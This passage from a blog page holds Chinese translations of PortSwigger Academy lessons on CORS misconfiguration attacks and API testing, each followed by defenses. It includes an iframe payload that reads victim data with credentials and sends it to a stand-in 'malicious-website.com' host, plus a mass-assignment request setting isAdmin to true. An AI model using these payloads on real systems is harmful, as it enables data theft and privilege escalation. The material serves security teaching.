<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: null </span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
<p>在这种情况下，攻击者可以使用各种技巧生成一个 Origin 头中包含 null 值的跨源请求。这将满足白名单要求，从而导致跨域访问。例如，可以使用如下形式的沙盒化 iframe 跨源请求来实现：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-top-navigation</span></span></span><br><span class="line"><span class="string"><span class="tag">allow-forms&quot;</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;script&gt; </span></span></span><br><span class="line"><span class="string"><span class="tag">    var req = new XMLHttpRequest(); </span></span></span><br><span class="line"><span class="string"><span class="tag">    req.onload = reqListener; </span></span></span><br><span class="line"><span class="string"><span class="tag">    req.open(&#x27;get&#x27;,&#x27;vulnerable-website.com/sensitive-victim-data&#x27;,true); </span></span></span><br><span class="line"><span class="string"><span class="tag">    req.withCredentials = true; req.send();  </span></span></span><br><span class="line"><span class="string"><span class="tag">    function reqListener() </span></span></span><br><span class="line"><span class="string"><span class="tag">    &#123; </span></span></span><br><span class="line"><span class="string"><span class="tag">        location=&#x27;malicious-website.com/log?key=&#x27;+this.responseText; </span></span></span><br><span class="line"><span class="string"><span class="tag">    &#125;; </span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="通过-CORS-信任关系利用-XSS-漏洞"><a href="#通过-CORS-信任关系利用-XSS-漏洞" class="headerlink" title="通过 CORS 信任关系利用 XSS 漏洞"></a>通过 CORS 信任关系利用 XSS 漏洞</h3><p>即使是 “正确” 配置的 CORS 也会在两个源之间建立信任关系。如果一个网站信任一个容易受到跨站脚本（XSS）攻击的源，那么攻击者就可以利用 XSS 漏洞注入一些 JavaScript 代码，利用 CORS 从信任这个易受攻击应用程序的网站上检索敏感信息。<br>假设收到以下请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /api/requestApiKey HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: https://subdomain.vulnerable-website.com </span><br><span class="line">Cookie: sessionid=...</span><br></pre></td></tr></table></figure>
<p>如果服务器响应如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com </span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
<p>那么在subdomain.vulnerable-website.com上发现 XSS 漏洞的攻击者就可以利用这个漏洞来检索 API 密钥，使用类似这样的 URL：</p>
<p><a target="_blank" rel="noopener" href="https://subdomain.vulnerable-website.com/?xss=">https://subdomain.vulnerable-website.com/?xss=</a><script>cors-stuff-here</script></p>
<h3 id="配置不当的-CORS-破坏-TLS-安全"><a href="#配置不当的-CORS-破坏-TLS-安全" class="headerlink" title="配置不当的 CORS 破坏 TLS 安全"></a>配置不当的 CORS 破坏 TLS 安全</h3><p>假设一个严格使用 HTTPS 的应用程序也将一个使用普通 HTTP 的受信任子域列入白名单。例如，当应用程序收到以下请求时：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /api/requestApiKey HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: http://trusted-subdomain.vulnerable-website.com </span><br><span class="line">Cookie: sessionid=...</span><br></pre></td></tr></table></figure>
<p>应用程序响应如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com </span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
<p>在这种情况下，能够拦截受害者用户流量的攻击者可以利用 CORS 配置来危害受害者与应用程序的交互。此攻击涉及以下步骤：</p>
<p>受害者用户发出任何普通 HTTP 请求。<br>攻击者注入一个重定向到<a target="_blank" rel="noopener" href="http://trusted-subdomain.vulnerable-website.com./">http://trusted-subdomain.vulnerable-website.com。</a><br>受害者的浏览器跟随重定向。<br>攻击者拦截普通 HTTP 请求，并返回一个包含对<a target="_blank" rel="noopener" href="https://vulnerable-website.com的/">https://vulnerable-website.com的</a> CORS 请求的伪造响应。<br>受害者的浏览器发出 CORS 请求，其中包含来源<a target="_blank" rel="noopener" href="http://trusted-subdomain.vulnerable-website.com./">http://trusted-subdomain.vulnerable-website.com。</a><br>应用程序允许该请求，因为这是一个列入白名单的来源。请求的敏感数据在响应中返回。<br>攻击者的伪造页面可以读取敏感数据并将其传输到攻击者控制的任何域。<br>即使易受攻击的网站在其他方面对 HTTPS 的使用很安全，没有 HTTP 端点，并且所有 cookie 都标记为安全，这种攻击仍然有效。</p>
<h3 id="内联网和无凭据的-CORS"><a href="#内联网和无凭据的-CORS" class="headerlink" title="内联网和无凭据的 CORS"></a>内联网和无凭据的 CORS</h3><p>大多数 CORS 攻击依赖于响应头Access-Control-Allow-Credentials: true的存在。如果没有这个头，受害者用户的浏览器将拒绝发送他们的 cookie，这意味着攻击者只能访问未经身份验证的内容，而他们通过直接浏览目标网站也能同样轻松地访问这些内容。<br>然而，有一种常见的情况是攻击者无法直接访问网站：当它是某个组织内联网的一部分，并且位于私有 IP 地址空间内时。内部网站的安全标准通常低于外部网站，这使得攻击者能够发现漏洞并获得进一步的访问权限。例如，私有网络内的跨源请求可能如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /reader?url=doc1.pdf </span><br><span class="line">Host: intranet.normal-website.com </span><br><span class="line">Origin: https://normal-website.com</span><br></pre></td></tr></table></figure>
<p>服务器响应如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>
<p>应用服务器信任来自任何来源的无凭据资源请求。如果私有 IP 地址空间内的用户访问公共互联网，那么外部站点就可以利用受害者的浏览器作为代理来访问内联网资源，从而进行基于 CORS 的攻击。</p>
<h2 id="如何防范基于-CORS-的攻击"><a href="#如何防范基于-CORS-的攻击" class="headerlink" title="如何防范基于 CORS 的攻击"></a>如何防范基于 CORS 的攻击</h2><p>CORS 漏洞主要是由于配置错误引起的。因此，防范 CORS 漏洞是一个配置问题。以下部分描述了一些针对 CORS 攻击的有效防御措施。</p>
<h3 id="正确配置跨源请求"><a href="#正确配置跨源请求" class="headerlink" title="正确配置跨源请求"></a>正确配置跨源请求</h3><p>如果一个网络资源包含敏感信息，应该在 Access-Control-Allow-Origin 头中正确指定来源。</p>
<h3 id="仅允许受信任的站点"><a href="#仅允许受信任的站点" class="headerlink" title="仅允许受信任的站点"></a>仅允许受信任的站点</h3><p>这似乎是显而易见的，但 Access-Control-Allow-Origin 头中指定的来源应该只是受信任的站点。特别是，在没有验证的情况下动态反映跨源请求中的来源很容易被利用，应该避免这种情况。</p>
<h3 id="避免将-null-列入白名单"><a href="#避免将-null-列入白名单" class="headerlink" title="避免将 null 列入白名单"></a>避免将 null 列入白名单</h3><p>避免使用Access-Control-Allow-Origin: null头。内部文档和沙盒化请求的跨源资源调用可以指定 null 来源。对于私有和公共服务器，应该根据受信任的来源正确定义 CORS 头。</p>
<h3 id="在内部网络中避免使用通配符"><a href="#在内部网络中避免使用通配符" class="headerlink" title="在内部网络中避免使用通配符"></a>在内部网络中避免使用通配符</h3><p>在内部网络中避免使用通配符。当内部浏览器可以访问不受信任的外部域时，仅依靠网络配置来保护内部资源是不够的。</p>
<h3 id="CORS-不能替代服务器端安全策略"><a href="#CORS-不能替代服务器端安全策略" class="headerlink" title="CORS 不能替代服务器端安全策略"></a>CORS 不能替代服务器端安全策略</h3><p>CORS 定义了浏览器的行为，它永远不能替代服务器端对敏感数据的保护 —— 攻击者可以直接伪造来自任何受信任来源的请求。因此，除了正确配置 CORS 之外，Web 服务器还应该继续对敏感数据应用保护措施，例如身份验证和会话管理。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/15/CORS/" data-id="cm74zu18q0000d46scl4rcrl9" data-title="CORS" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-API测试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/10/API%E6%B5%8B%E8%AF%95/" class="article-date">
  <time class="dt-published" datetime="2025-02-10T12:07:17.000Z" itemprop="datePublished">2025-02-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/10/API%E6%B5%8B%E8%AF%95/">API测试</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>API（应用程序编程接口）使软件系统和应用程序能够进行通信和共享数据。API测试非常重要，因为API中的漏洞可能会破坏网站的保密性、完整性和可用性等核心方面。</p>
<p>所有动态网站都由API组成，因此经典的Web漏洞（如SQL注入）也可以归类为API测试。在本主题中，我们将教您如何测试网站前端未完全使用的API，重点是RESTful和JSON API。我们还将教您如何测试可能影响内部API的服务器端参数污染漏洞。</p>
<h2 id="API侦察"><a href="#API侦察" class="headerlink" title="API侦察"></a><strong>API侦察</strong></h2><p>要开始API测试，首先需要尽可能多地了解API的信息，以发现其攻击面。</p>
<p>首先，应该识别API端点。这些是API在其服务器上接收关于特定资源的请求的位置。例如，考虑以下GET请求：</p>
<p>复制GET &#x2F;api&#x2F;books HTTP&#x2F;1.1 Host: <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a></p>
<p>此请求的API端点是<code>/api/books</code>。这将导致与API的交互，以从图书馆检索书籍列表。另一个API端点可能是例如<code>/api/books/mystery</code>，它将检索悬疑书籍列表。</p>
<p>识别端点后，您需要确定如何与它们交互。这使您能够构建有效的HTTP请求以测试API。例如，您应该了解以下内容：</p>
<ul>
<li>API处理的输入数据，包括强制性和可选参数。</li>
<li>API接受的请求类型，包括支持的HTTP方法和媒体格式。</li>
<li>速率限制和认证机制。</li>
</ul>
<h2 id="API文档"><a href="#API文档" class="headerlink" title="API文档"></a><strong>API文档</strong></h2><p>API通常会进行文档化，以便开发人员知道如何使用和集成它们。</p>
<p>文档可以是人类可读的和机器可读的。人类可读的文档旨在让开发人员了解如何使用API。它可能包括详细说明、示例和使用场景。机器可读的文档旨在被软件处理，以自动化API集成和验证等任务。它以JSON或XML等结构化格式编写。</p>
<p>API文档通常是公开可用的，特别是如果API旨在供外部开发人员使用。如果是这种情况，请始终从审查文档开始您的侦察。</p>
<h2 id="发现API文档"><a href="#发现API文档" class="headerlink" title="发现API文档"></a><strong>发现API文档</strong></h2><p>即使API文档没有公开提供，您仍然可以通过浏览使用API的应用程序来访问它。</p>
<p>为此，您可以使用Burp Scanner来爬取API。您也可以使用Burp的浏览器手动浏览应用程序。寻找可能指向API文档的端点，例如：</p>
<ul>
<li><code>/api</code></li>
<li><code>/swagger/index.html</code></li>
<li><code>/openapi.json</code></li>
</ul>
<p>如果您识别出一个资源端点，请确保调查基础路径。例如，如果您识别出资源端点<code>/api/swagger/v1/users/123</code>，那么您应该调查以下路径：</p>
<ul>
<li><code>/api/swagger/v1</code></li>
<li><code>/api/swagger</code></li>
<li><code>/api</code></li>
</ul>
<p>您还可以使用Intruder和常见路径列表来查找文档。</p>
<h2 id="使用机器可读文档"><a href="#使用机器可读文档" class="headerlink" title="使用机器可读文档"></a><strong>使用机器可读文档</strong></h2><p>您可以使用一系列自动化工具来分析您找到的任何机器可读的API文档。</p>
<p>您可以使用Burp Scanner来爬取和审计OpenAPI文档，或者任何其他JSON或YAML格式的文档。您还可以使用OpenAPI解析器BApp来解析OpenAPI文档。</p>
<p>您也可以使用专门的工具来测试文档化的端点，例如Postman或SoapUI。</p>
<h2 id="识别API端点"><a href="#识别API端点" class="headerlink" title="识别API端点"></a><strong>识别API端点</strong></h2><p>您还可以通过浏览使用API的应用程序来获取大量信息。即使您有API文档，这也值得一做，因为有时文档可能不准确或过时。</p>
<p>您可以使用Burp Scanner来爬取应用程序，然后使用Burp的浏览器手动调查有趣的攻击面。</p>
<p>在浏览应用程序时，寻找URL结构中暗示API端点的模式，例如<code>/api/</code>。还要注意JavaScript文件。这些文件可能包含您尚未通过Web浏览器直接触发的API端点的引用。Burp Scanner在爬取过程中会自动提取一些端点，但为了进行更深入的提取，请使用JS链接查找器BApp。您也可以在Burp中手动审查JavaScript文件。</p>
<h2 id="与API端点交互"><a href="#与API端点交互" class="headerlink" title="与API端点交互"></a><strong>与API端点交互</strong></h2><p>识别API端点后，使用Burp Repeater和Burp Intruder与它们交互。这使您能够观察API的行为并发现额外的攻击面。例如，您可以研究API在更改HTTP方法和媒体类型时的响应。</p>
<p>在与API端点交互时，仔细审查错误消息和其他响应。有时这些消息中包含可用于构建有效HTTP请求的信息。</p>
<h2 id="识别支持的HTTP方法"><a href="#识别支持的HTTP方法" class="headerlink" title="识别支持的HTTP方法"></a><strong>识别支持的HTTP方法</strong></h2><p>HTTP方法指定要对资源执行的操作。例如：</p>
<ul>
<li>GET - 从资源中检索数据。</li>
<li>PATCH - 对资源应用部分更改。</li>
<li>OPTIONS - 检索可以对资源使用的请求方法类型。</li>
</ul>
<p>API端点可能支持不同的HTTP方法。因此，在调查API端点时，测试所有潜在方法非常重要。这可能使您能够识别额外的端点功能，从而扩大攻击面。</p>
<p>例如，端点<code>/api/tasks</code>可能支持以下方法：</p>
<ul>
<li>GET <code>/api/tasks</code> - 检索任务列表。</li>
<li>POST <code>/api/tasks</code> - 创建一个新任务。</li>
<li>DELETE <code>/api/tasks/1</code> - 删除一个任务。</li>
</ul>
<p>您可以使用Burp Intruder内置的HTTP动词列表，自动循环使用一系列方法。</p>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>在测试不同的HTTP方法时，针对低优先级对象。这有助于确保您避免意外后果，例如更改关键项目或创建过多记录。</p>
<h2 id="识别支持的内容类型"><a href="#识别支持的内容类型" class="headerlink" title="识别支持的内容类型"></a><strong>识别支持的内容类型</strong></h2><p>API端点通常期望以特定格式接收数据。因此，它们可能会根据请求中提供的数据内容类型而表现出不同的行为。更改内容类型可能使您能够：</p>
<ul>
<li>触发披露有用信息的错误。</li>
<li>绕过有缺陷的防御。</li>
<li>利用处理逻辑的差异。例如，API在处理JSON数据时可能是安全的，但在处理XML时可能容易受到注入攻击。</li>
</ul>
<p>要更改内容类型，请修改<code>Content-Type</code>头，然后相应地重新格式化请求正文。您可以使用内容类型转换器BApp自动将请求中提交的数据在XML和JSON之间转换。</p>
<h2 id="使用Intruder查找隐藏端点"><a href="#使用Intruder查找隐藏端点" class="headerlink" title="使用Intruder查找隐藏端点"></a><strong>使用Intruder查找隐藏端点</strong></h2><p>识别了一些初始API端点后，您可以使用Intruder来发现隐藏的端点。例如，假设您识别出以下用于更新用户信息的API端点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT /api/user/update</span><br></pre></td></tr></table></figure>

<p>要识别隐藏的端点，您可以使用Burp Intruder来查找具有相同结构的其他资源。例如，您可以在路径的<code>/update</code>位置添加一个有效载荷，使用其他常见函数（如<code>delete</code>和<code>add</code>）的列表。</p>
<p>在查找隐藏端点时，使用基于常见API命名约定和行业术语的字典。确保您还包括基于初始侦察与应用程序相关的术语。</p>
<h2 id="寻找隐藏参数"><a href="#寻找隐藏参数" class="headerlink" title="寻找隐藏参数"></a><strong>寻找隐藏参数</strong></h2><p>在进行API侦察时，您可能会发现API支持的未记录参数。您可以尝试使用这些参数来改变应用程序的行为。Burp包含许多可以帮助您识别隐藏参数的工具：</p>
<ul>
<li>Burp Intruder使您能够使用常见参数名称的字典自动发现隐藏参数，以替换现有参数或添加新参数。确保您还包括基于初始侦察与应用程序相关的名称。</li>
<li>Param Miner BApp使您能够自动猜测每个请求的多达65,536个参数名称。Param Miner根据范围中的信息自动猜测与应用程序相关的名称。</li>
<li>内容发现工具使您能够发现未从可见内容链接的内容，包括参数。</li>
</ul>
<h2 id="批量赋值漏洞"><a href="#批量赋值漏洞" class="headerlink" title="批量赋值漏洞"></a><strong>批量赋值漏洞</strong></h2><p>批量赋值（也称为自动绑定）可能会无意中创建隐藏参数。当软件框架自动将请求参数绑定到内部对象的字段时，就会发生这种情况。因此，批量赋值可能导致应用程序支持开发人员从未打算处理的参数。</p>
<h2 id="识别隐藏参数"><a href="#识别隐藏参数" class="headerlink" title="识别隐藏参数"></a><strong>识别隐藏参数</strong></h2><p>由于批量赋值是从对象字段创建参数的，您通常可以通过手动检查API返回的对象来识别这些隐藏参数。</p>
<p>例如，考虑一个PATCH <code>/api/users/</code>请求，允许用户更新他们的用户名和电子邮件，并包含以下JSON：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener@example.com&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>同时，一个并发的GET <code>/api/users/123</code>请求返回以下JSON：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;id&quot;: 123, &quot;name&quot;: &quot;John Doe&quot;, &quot;email&quot;: &quot;john@example.com&quot;, &quot;isAdmin&quot;: &quot;false&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>这可能表明隐藏的<code>id</code>和<code>isAdmin</code>参数与内部用户对象绑定，与更新的用户名和电子邮件参数一起。</p>
<h2 id="测试批量赋值漏洞"><a href="#测试批量赋值漏洞" class="headerlink" title="测试批量赋值漏洞"></a><strong>测试批量赋值漏洞</strong></h2><p>要测试您是否可以修改枚举出的<code>isAdmin</code>参数值，请将其添加到PATCH请求中：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;username&quot;: &quot;wiener&quot;, &quot;email&quot;: &quot;wiener@example.com&quot;, &quot;isAdmin&quot;: false &#125;</span><br></pre></td></tr></table></figure>

<p>此外，发送一个带有无效<code>isAdmin</code>参数值的PATCH请求：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;username&quot;: &quot;wiener&quot;, &quot;email&quot;: &quot;wiener@example.com&quot;, &quot;isAdmin&quot;: &quot;foo&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>如果应用程序的行为不同，这可能表明无效值影响了查询逻辑，但有效值没有。这可能表明用户可以成功更新该参数。</p>
<p>然后，您可以发送一个将<code>isAdmin</code>参数值设置为<code>true</code>的PATCH请求，尝试利用该漏洞：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;username&quot;: &quot;wiener&quot;, &quot;email&quot;: &quot;wiener@example.com&quot;, &quot;isAdmin&quot;: true &#125;</span><br></pre></td></tr></table></figure>

<p>如果请求中的<code>isAdmin</code>值绑定到用户对象而没有足够的验证和清理，用户wiener可能会被错误地授予管理员权限。要确定是否是这种情况，请以wiener身份浏览应用程序，看看是否可以访问管理员功能。</p>
<h2 id="防止API中的漏洞"><a href="#防止API中的漏洞" class="headerlink" title="防止API中的漏洞"></a><strong>防止API中的漏洞</strong></h2><p>在设计API时，确保从一开始就考虑安全性。特别是，您要确保：</p>
<ul>
<li>如果您不希望API公开可访问，请保护您的文档。</li>
<li>确保文档保持最新，以便合法测试人员能够全面了解API的攻击面。</li>
<li>应用允许的HTTP方法白名单。</li>
<li>验证每个请求或响应的内容类型是否符合预期。</li>
<li>使用通用错误消息，以避免泄露可能对攻击者有用的信息。</li>
<li>在所有版本的API上使用保护措施，而不仅仅是当前生产版本。</li>
</ul>
<p>为了防止批量赋值漏洞，允许用户更新的属性列入白名单，并将不应由用户更新的敏感属性列入黑名单。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>文章翻译来自portswigger的academy文章：</p>
<p><a href="https://link.zhihu.com/?target=https://portswigger.net/web-security/api-testing">API testing | Web Security Academyportswigger.net&#x2F;web-security&#x2F;api-testing</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/10/API%E6%B5%8B%E8%AF%95/" data-id="cm70ivegq0002fk6s5uoweijz" data-title="API测试" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/02/15/CSRF(1)/">CSRF</a>
          </li>
        
          <li>
            <a href="/2025/02/15/CSRF(2)/">绕过 CSRF 令牌验证</a>
          </li>
        
          <li>
            <a href="/2025/02/15/CORS/">CORS</a>
          </li>
        
          <li>
            <a href="/2025/02/10/API%E6%B5%8B%E8%AF%95/">API测试</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>